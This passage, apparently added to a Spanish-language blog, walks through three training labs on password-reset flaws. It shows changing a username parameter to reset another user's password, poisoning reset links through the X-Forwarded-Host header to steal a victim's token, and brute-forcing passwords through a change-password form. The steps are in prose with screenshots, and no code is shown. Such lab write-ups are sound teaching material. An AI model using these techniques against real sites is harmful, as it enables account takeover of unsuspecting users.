+</code></pre>
+
+<p>Sin embargo, un atacante podría pedir un reseto de contraseña y cambiar el parámetro para modificar la contraseña de cualquier usuario teniendo acceso a su cuenta.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 12: Password reset broken logic</strong>.</p>
+
+<p>Este laboratorio tiene una vulnerabilidad en la funcionalidad de reseteo de la contraseña. Para resolver el laboratorio resetear la contraseña del usuario Carlos.</p>
+
+<p>Una vez le damos al botón “forgot your password?” y seguimos el enlace que se envía a nuestro email, nos encontramos ante una ventana que nos pide que introduzcamos una contraseña nueva. Interceptando esta request antes de enviarla vemos lo siguiente:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220407104312.png" text-align="center" />
+</div>
+
+<p>Podemos observar que el parámetro que decide a qué usuario se resetea la página va en la propia request, en este caso: wiener.</p>
+
+<p>Cambiando el valor de este parámetro de wiener a carlos habríamos resetado la contraseña del propio carlos y sólo quedaría logearse con su nombre de usuario y su nueva contraseña.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220407104543.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<ul>
+  <li><strong>Reseteo de la password utilizando tokens (APÉNDICE más abajo):</strong> Una mejor implementación del proceso anterior consiste en generar un alto grado de entropía en la request (desorden) de forma que alguien que la lea no sea capaz de descifrar/modificar a qué usuario se le va a cambiar la contraseña.</li>
+</ul>
+
+<p>Este token existe a su vez en el back-end de la aplicación, de forma que el valor que contiene la request y el valor que existen en el servidor coinciden y este está relacionado para un usuario concreto.</p>
+
+<p>Algunos sitios web tienen una falla que consiste en eliminar el token de su request provocando, por una mala configuración del servidor, que su cuenta se vea leveada para cambiar cualquier contraseña.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 13: Password reset broken logic via middleware</strong>. (No funciona X-Forwarded-Host)</p>
+
+<p>Este laboratorio es vulnerable a un “envenenamiento del reseteo de contraseña” (password reset poisoning).</p>
+
+<p>En este caso concretamente se emplea una cabecera (X-Forwarded-Host) para cambiar la dirección del enlace de reseteo de contraseña que llega al email del propietario de la cuenta que ha solicitado dicho reseteo:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220628135610.png" text-align="center" />
+</div>
+
+<p>Y en el email obtenemos:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220628135630.png" text-align="center" />
+</div>
+
+<p>De esta forma, podemos poner como valor la dirección de un servidor bajo nuestro control, en este caso: el exploit server:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220628140341.png" text-align="center" />
+</div>
+
+<p>Y de nombre de usuario carlos. Así, si carlos pincha en el enlace, se llevará a cabo una request con el token como parámetro a nuestro exploit server y podremos ver dihca petición en el “log” accediendo así al token:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220628140501.png" text-align="center" />
+</div>
+
+<p>De esta manera, solicitamos nosotros un reseteo de contraseña, pinchamos en el link del email e interceptamos la request antes de envialar cambiando el token de acceso por el que acabamos de robar. Así, cambiaremos la contraseña del usuario Carlos y tendremos acceso a su cuenta.</p>
+
+<p><br /></p>
+
+<ul>
+  <li><strong>Cambiando la contraseña</strong></li>
+</ul>
+
+<p>Típicamente, cuando se quiere cambiar la contraseña se pide introducir la contraseña que ya tienes y la nueva contraseña dos veces.</p>
+
+<p>Estas páginas se basan en el mismo mecanismo que las anteriores que resetean la contraseña y por ende son vulnerables a la misma clase de ataques.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 14: Password brute-force via password change</strong>.</p>
+
+<p>Este laboratorio contiene una funcionalidad de cambio de contraseña que es vulnerable a un ataque de fuerza bruta.</p>
+
+<p>Logeándonos como wiener:peter y seleccionando cambiar contraseña podemos observar que en la petición se encuentran los siguientes parámetros:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220407121847.png" text-align="center" />
+</div>
+
+<p>Es decir, que en la propia solicitud del cambio de contraseña se verifica la identidad del usuario cuya contraseña va a ser cambiada.</p>
+
+<p>De esta forma, podemos cambiar dicha identidad para descubrir cuál es la contraseña autentica del usuario Carlos.</p>
+
+<p>Cuando la contraseña de Carlos coincida con la autentica aparecerá este mensaje de error:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220407130929.png" text-align="center" />
+</div>
+
+<p>Así, lanzamos la siguiente request</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220407131132.png" text-align="center" />
+</div>
+
+<p>Finalmente obtenemos:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220407131640.png" text-align="center" />
+</div>
+
